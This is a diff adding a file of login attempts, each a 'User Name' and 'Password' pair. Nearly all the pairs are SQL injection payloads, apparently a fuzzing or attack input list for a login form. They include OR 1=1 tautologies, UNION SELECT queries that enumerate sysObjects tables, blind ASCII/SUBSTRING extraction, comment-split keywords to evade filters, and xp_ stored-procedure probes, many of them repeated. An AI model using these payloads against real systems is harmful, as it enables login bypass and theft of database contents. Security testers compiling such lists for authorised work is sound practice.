@@ -1,0 +1,100 @@
+User Name:admin
+Password:1111111
+User Name:admin'
+Password:1111111
+User Name:admin
+Password:1111111'
+User Name:admin
+Password:1111111"
+User Name:admin
+Password:1111111"-- 
+User Name:1 OR 1=1
+Password:
+User Name:1 OR 1=1
+Password:1 UNI/**/ON SELECT ALL FROM WHERE
+User Name:1 OR 1=1
+Password:1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = 'U' --
+User Name:1 OR 1=1
+Password:1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) > 116
+User Name:1 OR 1=1
+Password:' OR username IS NOT NULL OR username = '
+User Name:1 OR 1=1
+Password:1' AND non_existant_table = '1
+User Name:1 OR 1=1
+Password:1'1
+User Name:1 OR 1=1
+Password:'; DESC users; --
+User Name:1 OR 1=1
+Password:1 AND USER_NAME() = 'dbo'
+User Name:1 OR 1=1
+Password:1' AND 1=(SELECT COUNT(*) FROM tablenames); --
+User Name:1 OR 1=1
+Password:1 AND 1=1
+User Name:1 OR 1=1
+Password:1 EXEC XP_
+User Name:1 OR 1=1
+Password:1'1
+User Name:1 OR 1=1
+Password:1' OR '1'='1
+User Name:1 OR 1=1
+Password:1 OR 1=1
+User Name:1 OR 1=1
+Password:
+User Name:1 OR 1=1
+Password:1' OR '1'='1
+User Name:1 OR 1=1
+Password:
+User Name:1 OR 1=1
+Password:
+User Name:1 OR 1=1
+Password:1' OR '1'='1
+User Name:1 OR 1=1
+Password:1 UNI/**/ON SELECT ALL FROM WHERE
+User Name:1 OR 1=1
+Password:1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = 'U' --
+User Name:1 OR 1=1
+Password:1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) > 116
+User Name:1 OR 1=1
+Password:' OR username IS NOT NULL OR username = '
+User Name:1 OR 1=1
+Password:1' AND non_existant_table = '1
+User Name:1 OR 1=1
+Password:1'1
+User Name:1 OR 1=1
+Password:'; DESC users; --
+User Name:1 OR 1=1
+Password:1 AND USER_NAME() = 'dbo'
+User Name:1 OR 1=1
+Password:1' AND 1=(SELECT COUNT(*) FROM tablenames); --
+User Name:1 OR 1=1
+Password:1 AND 1=1
+User Name:1 OR 1=1
+Password:1 EXEC XP_
+User Name:1 OR 1=1
+Password:1'1
+User Name:1 OR 1=1
+Password:1' OR '1'='1
+User Name:1 OR 1=1
+Password:1 OR 1=1
+User Name:1 OR 1=1
+Password:1'1
+User Name:1 OR 1=1
+Password:1 AND USER_NAME() = 'dbo'
+User Name:1 OR 1=1
+Password:1' AND 1=(SELECT COUNT(*) FROM tablenames); --
+User Name:1 OR 1=1
+Password:1 AND 1=1
+User Name:1 OR 1=1
+Password:1'1
+User Name:1 OR 1=1
+Password:1' OR '1'='1
+User Name:1 OR 1=1
+Password:'; DESC users; --
+User Name:1 OR 1=1
+Password:1 EXEC XP_
+User Name:1 OR 1=1
+Password:1 OR 1=1
+User Name:1 OR 1=1
+Password:
+User Name:
+Password:
